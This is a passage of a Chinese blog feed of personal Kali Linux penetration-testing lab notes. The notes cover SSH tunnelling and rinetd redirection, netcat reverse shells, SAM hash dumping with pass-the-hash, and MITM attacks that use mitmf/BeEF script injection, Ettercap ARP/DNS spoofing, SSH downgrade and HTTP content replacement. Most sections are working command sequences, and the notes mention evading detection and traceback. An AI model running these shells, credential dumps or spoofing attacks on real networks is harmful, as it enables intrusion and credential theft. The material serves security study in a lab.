<li>开启远程桌面，cmd修改管理员密码（<strong><code>🔺命令：net user administrator *</code></strong>）</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfNg -L 7004:Window Server 2003的IP:3389 root@Kali的IP -p 53</code></strong></li>
</ul>
</li>
<li>Window XP<ul>
<li>mstsc打开远程桌面，测试是否能进行远程桌面登陆（Window Server 2003的远程桌面）</li>
</ul>
</li>
</ul>
<h4 id="8-NC-shell"><a href="#8-NC-shell" class="headerlink" title="8. NC shell"></a>8. NC shell</h4><ul>
<li>Window Server 2003<ul>
<li>装入NC程序，<strong><code>🔺命令：nc -nvlp 3333</code></strong></li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfNg -L 7005:Window Server 2003的IP:3333 root@Kali的IP -p 53</code></strong></li>
</ul>
</li>
<li>Window XP<ul>
<li><strong><code>🔺命令：nc bodhi的IP bodhi的端口 -e cmd</code></strong></li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/SSH%E9%9A%A7%E9%81%93%E5%B0%9D%E8%AF%95.PNG" srcset="/img/loading.gif" alt="SSH隧道尝试"></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(六十五)：流量操控、重定向</title>
    <url>/2020/01/31/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E3%80%81%E9%87%8D%E5%AE%9A%E5%90%91/</url>
    <content><![CDATA[<hr>
<h4 id="1-流量操控技术"><a href="#1-流量操控技术" class="headerlink" title="1. 流量操控技术"></a>1. 流量操控技术</h4><ul>
<li>Traffic manipulation technique </li>
<li>渗透测试中经常遇到访问受限的网络环境<ul>
<li>防火墙/交换机，端口映射相比于主机直接外网访问更安全</li>
<li>DNS，TCP/UDP的53端口，基本不过滤</li>
<li>SSH，22端口，基本不过滤</li>
<li>通过与家里的电脑进行连接，达到可以访问其他网络资源的结果</li>
</ul>
</li>
<li>使用隐蔽的手段逃避安全检查措施和朔源追踪<ul>
<li>使明文传输的内容变成加密的内容，躲避安全检查</li>
<li>跳转攻击源头难以追踪，使用肉鸡进行攻击</li>
</ul>
</li>
<li>证明看似严格的访问控制仍然存在弱点</li>
<li>在非受信任的网络中实现安全的数据传输<ul>
<li>难以规避非受信任网络的中间人攻击（arp地址欺骗）</li>
<li>通过与信任的节点进行连接，加密数据，达到数据转发传输的结果</li>
</ul>
</li>
<li>部分概念的实现过程略有烧脑</li>
</ul>
<h4 id="2-流量操控技术"><a href="#2-流量操控技术" class="headerlink" title="2. 流量操控技术"></a>2. 流量操控技术</h4><ul>
<li>重定向（Redirection）<ul>
<li>IP、Port</li>
<li>不进行加密处理，只是作为中间转发</li>
</ul>
</li>
<li>隧道（Tunneling）<ul>
<li>在不受信任的网络环境中实现安全的通信（两个节点之间的加密流量传输）</li>
<li>通常使用多种加密技术建立通信隧道</li>
<li>点到点（IP2IP）、端到端（Port2Port）<ul>
<li>点到点的安全只有在隧道之间，内网的传输是明文</li>
<li>端到端是两个进程之间的加密，基本不存在中间人攻击</li>
</ul>
</li>
<li>VPN<ul>
<li>pptp（不太安全技术，客户端到目标网络，▲过程有几个明文传输）</li>
<li>l2tp（二层VPN技术，客户端到目标网络）</li>
<li>IPSec（安全性首选，站点到站点）</li>
<li>SSL vpn（端到端的VPN，客户端使用连接服务器）</li>
<li>SSH</li>
</ul>
</li>
</ul>
</li>
<li>封装（encapsulation）<ul>
<li>通常结合在隧道中使用，使用一种协议封装一种协议（RPC o http、VoIP）</li>
<li>使用网关设备实现不同类型网络的互联互通</li>
</ul>
</li>
</ul>
<h4 id="3-重定向"><a href="#3-重定向" class="headerlink" title="3. 重定向"></a>3. 重定向</h4><ul>
<li>Rinetd<ul>
<li>安装：<strong><code>🔺命令：apt-get install rinetd</code></strong></li>
<li>配置：/etc/rinetd.conf（bindaddress bindport connectaddress connectport）</li>
<li>运行：<strong><code>🔺命令：rinetd</code></strong></li>
</ul>
</li>
<li>应用场景<ul>
<li>重定向web流量，突破上网限制</li>
<li>远程桌面重定向</li>
<li>Nc重定向获得Shell</li>
<li>不兼容FTP等二次连接的协议</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/%E9%87%8D%E5%AE%9A%E5%90%91.PNG" srcset="/img/loading.gif" alt="重定向"></p>
<h4 id="4-80端口Web服务访问"><a href="#4-80端口Web服务访问" class="headerlink" title="4. 80端口Web服务访问"></a>4. 80端口Web服务访问</h4><ul>
<li>安装monowall防火墙<ul>
<li>需要两块网卡，第一块网卡为连接内网的Host-Only网卡，第二块为连接外网的桥接网卡</li>
<li>安装光盘放进去ISO文件</li>
<li>选择7，Install on Hard Drive，安装在硬盘上</li>
<li>输入设备ad0</li>
<li>重启并拔出ISO光盘</li>
</ul>
</li>
<li>monowall防火墙配置<ul>
<li>硬盘启动</li>
<li>选择1，指定网卡接口，不需要vlan</li>
<li>输入LAN局域网接口em0，输入WAN广域网接口em1，无需其他的端口设置</li>
<li>重启设备</li>
</ul>
</li>
<li>monowall再配置<ul>
<li>硬盘启动</li>
<li>选择2，指定局域网IP地址，子网掩码（bit数），DHCP服务</li>
<li>选择3，重置webGUI界面，重置为mono</li>
<li>选择5，重启mono</li>
</ul>
</li>
<li>开启一台win xp sp3电脑<ul>
<li>选择Host-only网络</li>
<li>ifconfig/进行ping通信、上网尝试</li>
</ul>
</li>
<li>进入monowall防火墙管理界面<ul>
<li>Rules，初始规则为LAN → Any</li>
<li>删除默认规则，进行外网访问尝试</li>
<li>新建一条规则，Action → Pass，Protocol → TCP/UDP，Destination port range → DNS</li>
<li>Apply进行应用</li>
</ul>
</li>
<li>Kali网络设置为桥接<ul>
<li>需要访问墙外流量</li>
<li><strong><code>🔺命令：apt-get install rinetd</code></strong></li>
<li><strong><code>🔺命令：vi /etc/rinetd.conf</code></strong>（指向的配置）<ul>
<li>bindaddress（本机侦听IP）</li>
<li>bindport（本机侦听端口）</li>
<li>connectaddress（连接IP）</li>
<li>connectport（侦听的端口）</li>
</ul>
</li>
<li>rinetd</li>
</ul>
</li>
<li>Window Server 2003网络设置为桥接<ul>
<li>开启远程桌面，cmd修改管理员密码（net user administrator *）</li>
<li>安装web server（Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS，可能需要光盘）</li>
<li>修改Web的首页面（C:\Inetpub\wwwroot\iisstart.html）</li>
<li>访问127.0.0.1进行尝试</li>
</ul>
</li>
<li>Win xp访问Kali主机IP的53端口</li>
</ul>
<h4 id="5-3389端口远程桌面访问"><a href="#5-3389端口远程桌面访问" class="headerlink" title="5. 3389端口远程桌面访问"></a>5. 3389端口远程桌面访问</h4><ul>
<li>Kali设置<ul>
<li><strong><code>🔺命令：vi /etc/rinetd.conf</code></strong>（指向的配置），修改connectport为3389端口</li>
<li><strong><code>🔺命令：pkill rinetd</code></strong></li>
<li><strong><code>🔺命令：rinetd</code></strong></li>
</ul>
</li>
<li>Win xp访问远程桌面<ul>
<li>Win+R → mstsc → Kali主机IP的53端口</li>
<li>尝试登陆，ifconfig</li>
</ul>
</li>
</ul>
<h4 id="6-NC获取shell"><a href="#6-NC获取shell" class="headerlink" title="6. NC获取shell"></a>6. NC获取shell</h4><ul>
<li>思想：XP执行NC把自己的Shell发给Kali的53端口，转发给Window Server 2003，在Window Server 2003用nc来接受Shell</li>
<li><strong><code>🔺命令：cp /usr/share/windows-binaries/nc.exe /root/Desktop</code></strong>（拷贝到XP和2003的机子上）</li>
<li>Window Server 2003<ul>
<li><strong><code>🔺命令：cmd → nc -nvlp 3333</code></strong></li>
</ul>
</li>
<li>Kali设置<ul>
<li><strong><code>🔺命令：vi /etc/rinetd.conf</code></strong>（指向的配置），修改connectport为3333端口</li>
<li><strong><code>🔺命令：pkill rinetd</code></strong></li>
<li><strong><code>🔺命令：rinetd</code></strong></li>
</ul>
</li>
<li>Window XP<ul>
<li><strong><code>🔺命令：nc Kali的IP地址 53 -e cmd</code></strong></li>
</ul>
</li>
<li>Window Server 2003进行ipconfig</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(六十四)：密码嗅探--传递Hash值</title>
    <url>/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%9B%9B)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%BC%A0%E9%80%92Hash%E5%80%BC/</url>
    <content><![CDATA[<hr>
<h4 id="1-Pass-the-Hash（PTH）"><a href="#1-Pass-the-Hash（PTH）" class="headerlink" title="1. Pass the Hash（PTH）"></a>1. Pass the Hash（PTH）</h4><ul>
<li>密码破解耗费时间资源巨大 </li>
<li>使用密文提交给服务器直接完成身份认证 </li>
<li>NTLM/LM是没有加严的静态HASH密文（▲传输密文每次都是一样的）</li>
<li>企业中使用ghost等工具克隆安装系统</li>
<li>操作<ul>
<li>Win7插入一个Kali光盘，用光盘启动</li>
<li><strong><code>🔺命令：mount /dev/sda2 /mnt</code></strong></li>
<li><strong><code>🔺命令：cd /mnt/Windows/System32/config</code></strong></li>
<li><strong><code>🔺命令：samdump2 SYSTEM SAM</code></strong></li>
<li>使用nc传递HASH值</li>
<li>Win7光盘释放重启，关闭Win7防火墙</li>
<li><strong><code>🔺命令：pth-winexe -U w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063 716ab7fe2a11faf126d8（用户名密码用%分卡） //Win7IP地址1.1.1.1 cmd</code></strong></li>
</ul>
</li>
<li>▲ 只适用于Window系统</li>
<li>▲ 2020.1.27 CreateService failed. NT_STATUS_ACCESS_DENIED</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(六十三)：密码嗅探--中间人攻击</title>
    <url>/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%89)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<hr>
<h4 id="1-中间人攻击（注入XSS）"><a href="#1-中间人攻击（注入XSS）" class="headerlink" title="1. 中间人攻击（注入XSS）"></a>1. 中间人攻击（注入XSS）</h4><ul>
<li>注入XSS<ul>
<li>结合ARP欺骗或DNS代理欺骗，实现中间人攻击</li>
<li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码 </li>
<li>一旦得手，影响范围巨大 </li>
<li>如果中间人发生在运营商线路上，很难引起用户注意，隐蔽性高 </li>
</ul>
</li>
</ul>
<h4 id="2-中间人攻击–Mitmf-Beef"><a href="#2-中间人攻击–Mitmf-Beef" class="headerlink" title="2. 中间人攻击–Mitmf*Beef"></a>2. 中间人攻击–Mitmf*Beef</h4><ul>
<li>Mitmf 安装（无核心技术内容，冗杂性大）▲ 2020.1.24一些依赖包以及安装包无法找到<ul>
<li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装） </li>
<li><strong><code>🔺命令：apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</code></strong> </li>
<li><strong><code>🔺命令：apt-get install mitmf</code></strong> </li>
<li><strong><code>🔺命令：pip uninstall twisted</code></strong> </li>
<li><strong><code>🔺命令：wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted15.5.0.tar.bz2</code></strong> </li>
<li><strong><code>🔺命令：pip install ./Twisted-15.5.0.tar.bz2</code></strong></li>
</ul>
</li>
<li>启动beef <ul>
<li><strong><code>🔺命令：cd /usr/share/beef-xss/</code></strong> </li>
<li><strong><code>🔺命令：./beef</code></strong> ▲ 2020.1.24修改为beef-xss（命令存在Bash中）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（结合Beef）<ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 1.1.1.1（正确网关地址） --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js</code></strong> （ARP地址欺骗）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（不结合Beef） <ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</code></strong>（ARP地址欺骗）</li>
<li>–upsidedownternet（图片倒转）、–screen（/var/log/mitmf，屏幕快照） </li>
<li>–ferretng（抓取cookie）、–browserprofiler（浏览器及插件信息） </li>
<li>–smbtrap（抓取smb）、–smbauth（smb认证）</li>
<li>–hsts（新的安全协议）<ul>
<li>HTTP Strict Transport Security </li>
<li>防止协议降级、cookie窃取 </li>
<li>安全策略通过HTTP响应头”Strict-Transport-Security”实施 </li>
<li>限制user-agent、https等</li>
</ul>
</li>
<li>–filepwn（EXE执行程序的下载，插入后门程序）<ul>
<li>凌空插后门 </li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-中间人攻击–Ettercap"><a href="#3-中间人攻击–Ettercap" class="headerlink" title="3. 中间人攻击–Ettercap"></a>3. 中间人攻击–Ettercap</h4><ul>
<li>Ettercap ▲ 2020.1.24Ettercap有点小问题，关于主机发现这一模块<ul>
<li>统一的中间人攻击工具 </li>
<li>转发MAC与本机相同，但IP与本机不同的数据包 </li>
<li>支持SSH1、SSL中间人攻击</li>
</ul>
</li>
<li>模块划分 <ul>
<li>Snifer </li>
<li>MITM </li>
<li>Filter </li>
<li>Log </li>
<li>Plugin</li>
</ul>
</li>
</ul>
<h4 id="4-Ettercap–Snifer"><a href="#4-Ettercap–Snifer" class="headerlink" title="4. Ettercap–Snifer"></a>4. Ettercap–Snifer</h4><ul>
<li>Snifer<ul>
<li>负责数据包转发</li>
<li>Unified<ul>
<li>单网卡情况下独立完成三层包转发</li>
<li>始终禁用内核IP_Forward功能</li>
</ul>
</li>
<li>Bridge <ul>
<li>双网卡情况下的一层MITM模式</li>
<li>可作为IPS过滤数据包</li>
<li>不可在网关上使用（透明网桥）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-Ettercap–MITM"><a href="#5-Ettercap–MITM" class="headerlink" title="5. Ettercap–MITM"></a>5. Ettercap–MITM</h4><ul>
<li>MITM <ul>
<li>把流量重定向到ettercap主机上 </li>
<li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li>
</ul>
</li>
<li>实现MITM的方法 <ul>
<li>ARP（一般为动态类型的ARP表）</li>
<li>ICMP <ul>
<li>ICMP路由重定向，半双工，回包不经过Kali（去包回包都经过Kali为全双工）</li>
<li>-M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</li>
</ul>
</li>
<li>DHCP <ul>
<li>修改网关地址，半双工，回包不经过Kali</li>
<li>DHCP发包过程Discover、Offer、Resquest、ACK</li>
<li>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</li>
</ul>
</li>
<li>Switch Port Stealing（交换机端口窃取）<ul>
<li>交换机根据源MAC地址更新</li>
<li>flood目标地址是本机，源地址是受害者的包（向交换机发送大量泛洪攻击）</li>
<li>适用于ARP静态绑定的环境（arp -s → 添加静态绑定的ARP）</li>
<li>-M port /1.1.1.1/ /1.1.1.2/ </li>
</ul>
</li>
<li>NDP <ul>
<li>IPv6协议欺骗技术</li>
<li>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li>
</ul>
</li>
</ul>
</li>
<li>Linux2.4以上内核对ARP地址欺骗的约束 <ul>
<li>收到非请求的ARP响应包，不更新本地ARP缓存 </li>
<li>Ettercap使用ARP request包进行攻击 </li>
</ul>
</li>
<li>Solaris不根据ARP包更新本地ARP缓存 <ul>
<li>Ettercap使用先发ICMP包来更新ARP缓存</li>
</ul>
</li>
</ul>
<h4 id="6-Ettercap–准备"><a href="#6-Ettercap–准备" class="headerlink" title="6. Ettercap–准备"></a>6. Ettercap–准备</h4><ul>
<li>用户操作界面 <ul>
<li>-T 文本界面（文本字符）</li>
<li>-G 图形界面 </li>
<li>-C 基于文本的图形界面（文本类似图形化）</li>
<li>-D 后台模式 </li>
</ul>
</li>
<li>指定目标 <ul>
<li>IPv4：MAC/IPv4/Ports </li>
<li>IPv6：MAC/IPv4/IPv6/Ports </li>
<li>/10.0.0.1−5;10.0.1.33/20−25,80,110</li>
</ul>
</li>
<li>权限 <ul>
<li>主配置文件：/etc/ettercap/etter.conf</li>
<li>需要root权限打开链路层Socket连接，然后使用nobody账号运行 </li>
<li>日志写入目录需要nobody有写入权 </li>
<li>修改etter.conf：EC_UID=65534/EC_GID=65534 → EC_UID=0/EC_GID=0</li>
</ul>
</li>
<li>基于伪造证书的SSL MITIM <ul>
<li>Bridge模式不支持SSL MITM ▲ 2020.1.24报额外参数的错误</li>
<li><strong><code>🔺命令：openssl genrsa −out etter.ssl.crt 1024</code></strong> </li>
<li><strong><code>🔺命令：openssl req −new−keyetter.ssl.crt −out tmp.csr</code></strong> </li>
<li><strong><code>🔺命令：openssl x509 −req −days 1825 −in tmp.csr −signkey etter.ssl.crt −out tmp.new</code></strong> </li>
<li><strong><code>🔺命令：cat tmp.new&gt;&gt;etter.ssl.crt</code></strong></li>
<li><strong><code>🔺命令：rm −f tmp.newtmp.csr</code></strong></li>
</ul>
</li>
</ul>
<h4 id="7-Ettercap–字符模式"><a href="#7-Ettercap–字符模式" class="headerlink" title="7. Ettercap–字符模式"></a>7. Ettercap–字符模式</h4><ul>
<li>参数<ul>
<li>-M（MITM技术）</li>
<li>-F（过滤器）</li>
<li>-P（模块）</li>
<li>-w（网络流量记录）</li>
<li>-l（简单记录日志）</li>
<li>-L（记录所有日志信息）</li>
<li>-m（账号密码信息）</li>
<li>-q（安静模式/有用的信息）</li>
</ul>
</li>
<li>MITM攻击<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></strong></li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap字符界面</li>
</ul>
</li>
<li>Ettercap 日志查看 ▲ 2020.1.24查看无权限<ul>
<li><strong><code>🔺命令：cat message</code></strong>（root目录下）</li>
<li><strong><code>🔺命令：ls log发现文件是加密信息</code></strong></li>
<li><strong><code>🔺命令：etterlog -p log.eci 查看获取的密码</code></strong></li>
<li><strong><code>🔺命令：etterlog -c log.ecp 列出Log中的连接</code></strong></li>
<li><strong><code>🔺命令：etterlog -c -f //1.1.1.1/ log.ecp</code></strong></li>
<li><strong><code>🔺命令：etterlog -B -n -s -F TCP:1.1.1.1:20;1.1.1.2:1234 log.ecp &gt; aa 选择相应的连接并榨取文件</code></strong></li>
</ul>
</li>
</ul>
<h4 id="8-Ettercap–图形界面"><a href="#8-Ettercap–图形界面" class="headerlink" title="8. Ettercap–图形界面"></a>8. Ettercap–图形界面</h4><ul>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
<h4 id="9-Ettercap–SSL中间人攻击"><a href="#9-Ettercap–SSL中间人攻击" class="headerlink" title="9. Ettercap–SSL中间人攻击"></a>9. Ettercap–SSL中间人攻击</h4><ul>
<li>SSL MITM（默认无开启，需要在配置文件中修改，图形界面）<ul>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.conf</code></strong>（Linux → The second iptables）</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
</ul>
<h4 id="10-Ettercap–DNS欺骗"><a href="#10-Ettercap–DNS欺骗" class="headerlink" title="10. Ettercap–DNS欺骗"></a>10. Ettercap–DNS欺骗</h4><ul>
<li>DNS欺骗（图形界面） <ul>
<li>dns_spoof插件配置文件 </li>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.dns</code></strong>（修改欺骗的域名对应的IP地址）</li>
<li>Plugins → Load a plugins → Load ec_dns_spoof.so</li>
<li>Plugins → Manage the plugins → 双击dns_spoof启动</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
<li>DNS欺骗（字符界面）<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -P dns_spoof</code></strong></li>
<li><strong><code>🔺命令：ipconfig /flushdns</code></strong></li>
<li><strong><code>🔺命令：ping 欺骗的域名</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-Ettercap–Filter"><a href="#11-Ettercap–Filter" class="headerlink" title="11. Ettercap–Filter"></a>11. Ettercap–Filter</h4><ul>
<li>Filter <ul>
<li>/usr/share/ettercap/</li>
<li>▲ SSH-2.xx / SSH-1.99（既支持SSH-1，也支持SSH-2） / SSH-1.51</li>
<li>etter.filter.ssh（ssh过滤文件，把SSH-2.xx/SSH-1.99转变为SSH-1.51）</li>
<li><strong><code>🔺命令：etterfilter etter.filter.ssh -o ssh.ef</code></strong></li>
<li><strong><code>🔺命令：mv ssh.ef /root</code></strong></li>
<li>直接调用 -F ssh.ef（若发送SSH-1.99，则降级SSH-1.99为SSH-1.51）</li>
</ul>
</li>
<li>替换HTTP内容（图片的内容可以替换为一个EXE或者脚本文件）</li>
</ul>
<pre><code>if (ip.proto == TCP &amp;&amp; tcp.src == 80) { 
     msg(&quot;data on TCP 80\n&quot;); 
         replace(&quot;img src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); 
     }</code></pre>]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(六十二)：密码嗅探--ARP地址欺骗、DNS代理欺骗</title>
    <url>/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--ARP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97%E3%80%81DNS%E4%BB%A3%E7%90%86%E6%AC%BA%E9%AA%97/</url>
    <content><![CDATA[<hr>
<h4 id="1-密码嗅探"><a href="#1-密码嗅探" class="headerlink" title="1. 密码嗅探"></a>1. 密码嗅探</h4><ul>
<li>二、三层地址<ul>
<li>IP网络到网络</li>
<li>MAC主机到主机（硬件固化地址，广播寻址）</li>
<li>▲ 路由器不转发广播</li>
<li>▲ 局域网内MAC寻址，广域网IP寻址</li>
</ul>
</li>
<li>交换机与HUB<ul>
<li>▲ HUB是物理层的设备，非二层设备，不识别MAC地址</li>
<li>HUB全端口转发，只要有数据包就转发给本网络所有主机（不安全）</li>
<li>交换机根据学习地址转发，形成APR地址列表</li>
<li>混杂模式抓包</li>
</ul>
</li>
<li>ARP协议（IP地址解析程MAC地址）<ul>
<li>免费ARP</li>
<li>基于广播学习</li>
<li>以太网头、ARP头</li>
<li>▲ 请求、响应相对独立（不请求也可以响应，可以人为构造响应包）</li>
<li>▲ 基于传闻的协议（无条件接受响应包，ARP地址欺骗根源）</li>
</ul>
</li>
</ul>
<h4 id="2-ARP地址欺骗（Win-7-→-Kali，单向欺骗）"><a href="#2-ARP地址欺骗（Win-7-→-Kali，单向欺骗）" class="headerlink" title="2. ARP地址欺骗（Win 7 → Kali，单向欺骗）"></a>2. ARP地址欺骗（Win 7 → Kali，单向欺骗）</h4><ul>
<li><strong><code>🔺命令：ping 网关</code></strong>（查看网络连通性）</li>
<li><strong><code>🔺命令：arp -a</code></strong>（查看网关地址）</li>
<li>使用OmniPeek构造ARP数据包，先抓取ARP的数据包</li>
<li><strong><code>🔺命令：arp -d</code></strong>（清除ARP缓存）</li>
<li><strong><code>🔺命令：ping 网关</code></strong>（重新发arp包）</li>
<li>选取ARP Response的数据包，Send → Edit Send Packet</li>
<li><strong><code>🔺命令：ping Kali的IP地址/arp -a</code></strong>（查看Kali的MAC地址）</li>
<li>Ethernet → 修改目的地的MAC地址为Kali的MAC地址</li>
<li>Ethernet → 修改源地址的MAC地址为Win7的MAC地址</li>
<li>ARP → Target Hardware Addr → Kali的MAC地址</li>
<li>ARP → Target Internet Addr → Kali的IP地址</li>
<li>Send → Send Window → Transmit One（可能需要持续发包）</li>
<li>Kali查看arp → <strong><code>🔺命令：arp -an</code></strong></li>
<li>Win7/kali抓包都可以看到ARP地址欺骗效果（发送ping数据包）</li>
<li>▲ 2020.1.27 Omnipeek need a Universal C Runtime</li>
</ul>
<h4 id="3-ARP地址欺骗（Kali-→-Win7）"><a href="#3-ARP地址欺骗（Kali-→-Win7）" class="headerlink" title="3. ARP地址欺骗（Kali → Win7）"></a>3. ARP地址欺骗（Kali → Win7）</h4><ul>
<li>手动修改数据包实现ARP欺骗</li>
<li>arpspoof（双向欺骗+路由转发）<ul>
<li><strong><code>🔺命令：echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></strong> </li>
<li><strong><code>🔺命令：arpspoof -t（目标） 1.1.1.12 -r（路由器） 1.1.1.1</code></strong>（发送的是arp的Rely）</li>
</ul>
</li>
<li>网络嗅探<ul>
<li>driftnet（传输图片的还原）<ul>
<li>-i（选择端口）</li>
<li>-a（存放保存）</li>
<li>-d（存放的路径）</li>
<li>-s（声音文件的保存）</li>
</ul>
</li>
<li><strong><code>🔺命令：driftnet -i eth0 -a -d /root/Desktop/tem -s</code></strong></li>
<li><strong><code>🔺命令：webspy -i eth0 1.1.1.1</code></strong>（抓取网络url地址）▲ 2020.1.27只能一个一个进行截取</li>
<li><strong><code>🔺命令：urlsnarf -i eth0</code></strong>（访问端口截断解析）</li>
<li><strong><code>🔺命令：dsniff -i eth0 -m</code></strong>（密码嗅探截获）<ul>
<li>/usr/share/dsniff/dsniff.services（支持协议解码类型）</li>
</ul>
</li>
<li><strong><code>🔺命令：dnsspoof -i eth0 -f /usr/lib/x86_64-linux-gnu/dnsspoof.hosts</code></strong>（DNS欺骗）<ul>
<li><strong><code>🔺命令：vi /usr/lib/x86_64-linux-gnu/</code></strong>dnsspoof.hosts（侦听目标机器53端口）</li>
<li>192.168.1.1 → *.taobao.com</li>
<li>Win7访问<a href="http://www.taobao.com（发生重定向）" target="_blank" rel="noopener">www.taobao.com（发生重定向）</a></li>
<li>▲ 2020.1.27 dnsspoof无法进行重定向，无法达到DNS欺骗的目的</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-DNS代理欺骗（Kali-→-Win7，实现流量的重定向）"><a href="#4-DNS代理欺骗（Kali-→-Win7，实现流量的重定向）" class="headerlink" title="4. DNS代理欺骗（Kali → Win7，实现流量的重定向）"></a>4. DNS代理欺骗（Kali → Win7，实现流量的重定向）</h4><ul>
<li>前提：有能力修改客户端的网络参数的配置（DNS/Host修改配置）</li>
<li>dnschef<ul>
<li>–fakeip（欺骗解析到的IP地址）</li>
<li>–fakedomains（伪造欺骗的域名）</li>
<li>–interface（进行网卡欺骗的动作，DNS侦听动作）</li>
</ul>
</li>
<li><strong><code>🔺命令：dnschef --fakeip=1.1.1.10 --fakedomains=www.google.com,www.youtube.com --interface 1.1.1.2（Kali主机IP）-q</code></strong></li>
<li>将被害者DNS指向伪造的DNS服务器（Win7修改DNS服务器）</li>
<li>Win7和Kali进行抓包比对</li>
<li>ping一个没有欺骗的域名看是否正常运作</li>
<li>▲ 2020.1.27可进行正常运行，也能截获到数据包，但无法进行重定向</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(六十一)：离线密码破解</title>
    <url>/2020/01/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%80)%EF%BC%9A%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<hr>
<h4 id="1-离线密码破解"><a href="#1-离线密码破解" class="headerlink" title="1. 离线密码破解"></a>1. 离线密码破解</h4><ul>
<li>身份认证<ul>
<li>禁止明文传输密码（存在大的安全问题）</li>
<li>每次认证使用HASH算法加密密码传输（HASH算法加密容易、解密困难）</li>
<li>服务器端用户数据应加严加密保存</li>
<li>服务器端保存用户密码的哈希值（进行哈希值匹配）</li>
</ul>
